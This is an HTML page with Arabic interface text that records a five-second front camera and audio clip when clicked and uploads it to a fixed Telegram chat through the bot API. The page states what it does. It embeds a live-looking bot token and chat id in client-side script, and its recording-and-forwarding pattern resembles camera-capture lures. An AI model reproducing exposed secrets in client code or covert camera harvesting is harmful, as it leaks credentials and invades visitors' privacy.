<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>إرسال فيديو إلى Telegram</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            padding: 20px;
            background-color: #f0f0f0;
            max-width: 100%;
            overflow-x: hidden;
        }
        #recordBtn {
            background-color: #28a745;
            color: white;
            border: none;
            padding: 20px;
            font-size: 20px;
            border-radius: 10px;
            cursor: pointer;
            margin: 20px 0;
            width: 100%;
            max-width: 300px;
        }
        #timer {
            font-size: 24px;
            margin: 10px 0;
            display: none;
            font-weight: bold;
        }
        #status {
            margin-top: 20px;
            padding: 15px;
            border-radius: 5px;
            display: none;
        }
        .success { background-color: #d4edda; color: #155724; }
        .error { background-color: #f8d7da; color: #721c24; }
        .recording { background-color: #dc3545; }
        .processing { background-color: #ffc107; color: #000; }
        #preview {
            margin: 20px auto;
            max-width: 100%;
            max-height: 300px;
            display: none;
            border-radius: 10px;
        }
    </style>
</head>
<body>
    <h2>إرسال فيديو إلى Telegram</h2>
    <button id="recordBtn">🎥 تسجيل فيديو (5 ثواني)</button>
    <div id="timer" style="display: none;">5</div>
    <video id="preview" controls></video>
    <div id="status"></div>

    <script>
        const botToken = '8316015659:AAFaKjIiQ5u8nPUFToCykLMKcQfZFqPjzKo';
        const chatId = '8096601840';
        let mediaRecorder = null;
        let recordedChunks = [];
        let countdown = null;
        let mediaStream = null;

        document.getElementById('recordBtn').addEventListener('click', async function() {
            const recordBtn = document.getElementById('recordBtn');
            const timer = document.getElementById('timer');
            const preview = document.getElementById('preview');
            
            try {
                // إذا كان التسجيل جارياً، توقف
                if (mediaRecorder && mediaRecorder.state === 'recording') {
                    mediaRecorder.stop();
                    recordBtn.disabled = true;
                    return;
                }
                
                // إعادة تعيين المتغيرات
                recordedChunks = [];
                
                // طلب إذن استخدام الكاميرا
                mediaStream = await navigator.mediaDevices.getUserMedia({ 
                    video: { 
                        facingMode: 'user',
                        width: { ideal: 640 },
                        height: { ideal: 480 }
                    },
                    audio: true
                });
                
                // إعداد مسجل الوسائط
                mediaRecorder = new MediaRecorder(mediaStream, {
                    mimeType: 'video/webm;codecs=vp9,opus',
                    videoBitsPerSecond: 2000000 // 2 Mbps
                });
                
                // معالجة البيانات المسجلة
                mediaRecorder.ondataavailable = function(e) {
                    if (e.data && e.data.size > 0) {
                        recordedChunks.push(e.data);
                    }
                };
                
                // عند انتهاء التسجيل
                mediaRecorder.onstop = async function() {
                    clearInterval(countdown);
                    timer.style.display = 'none';
                    recordBtn.textContent = '🎥 تسجيل فيديو (5 ثواني)';
                    recordBtn.style.backgroundColor = '#28a745';
                    recordBtn.disabled = false;
                    
                    if (recordedChunks.length === 0) {
                        showStatus('لم يتم تسجيل أي فيديو', 'error');
                        return;
                    }
                    
                    // إنشاء فيديو للمعاينة
                    const blob = new Blob(recordedChunks, { type: 'video/webm' });
                    const url = URL.createObjectURL(blob);
                    preview.src = url;
                    preview.style.display = 'block';
                    
                    // إرسال الفيديو
                    await sendVideoToTelegram(blob);
                    
                    // إيقاف الكاميرا
                    if (mediaStream) {
                        mediaStream.getTracks().forEach(track => track.stop());
                        mediaStream = null;
                    }
                };
                
                // بدء التسجيل
                mediaRecorder.start(100); // تجزئة التسجيل إلى قطع كل 100 مللي ثانية
                recordBtn.textContent = '⏹ إيقاف التسجيل';
                recordBtn.style.backgroundColor = '#dc3545';
                
                // بدء العد التنازلي
                let seconds = 5;
                timer.textContent = seconds;
                timer.style.display = 'block';
                
                countdown = setInterval(() => {
                    seconds--;
                    timer.textContent = seconds;
                    
                    if (seconds <= 0) {
                        clearInterval(countdown);
                        mediaRecorder.stop();
                    }
                }, 1000);
                
            } catch (error) {
                console.error('Error:', error);
                showStatus('حدث خطأ: ' + error.message, 'error');
                recordBtn.disabled = false;
            }
        });
        
        async function sendVideoToTelegram(blob) {
            showStatus('جاري إرسال الفيديو...', 'processing');
            
            try {
                const formData = new FormData();
                formData.append('chat_id', chatId);
                formData.append('video', blob, 'video.webm');
                formData.append('caption', 'فيديو مسجل من الهاتف - 5 ثواني');
                formData.append('supports_streaming', 'true');
                
                const response = await fetch(`https://api.telegram.org/bot${botToken}/sendVideo`, {
                    method: 'POST',
                    body: formData
                });
                
                const data = await response.json();
                
                if (data.ok) {
                    showStatus('تم إرسال الفيديو بنجاح!', 'success');
                    // إخفاء المعاينة بعد الإرسال الناجح
                    setTimeout(() => {
                        document.getElementById('preview').style.display = 'none';
                    }, 3000);
                } else {
                    let errorMsg = 'فشل في إرسال الفيديو';
                    if (data.description) {
                        errorMsg += ': ' + data.description;
                    }
                    showStatus(errorMsg, 'error');
                }
            } catch (error) {
                console.error('Error sending video:', error);
                showStatus('حدث خطأ في الإرسال: ' + error.message, 'error');
            }
        }
        
        function showStatus(message, type) {
            const statusElement = document.getElementById('status');
            statusElement.textContent = message;
            statusElement.className = type;
            statusElement.style.display = 'block';
            
            // إخفاء الرسالة بعد 5 ثواني
            setTimeout(() => {
                if (statusElement.textContent === message) {
                    statusElement.style.display = 'none';
                }
            }, 5000);
        }
        
        // تنظيف الموارد عند مغادرة الصفحة
        window.addEventListener('beforeunload', () => {
            if (mediaStream) {
                mediaStream.getTracks().forEach(track => track.stop());
            }
        });
    </script>
</body>
</html>
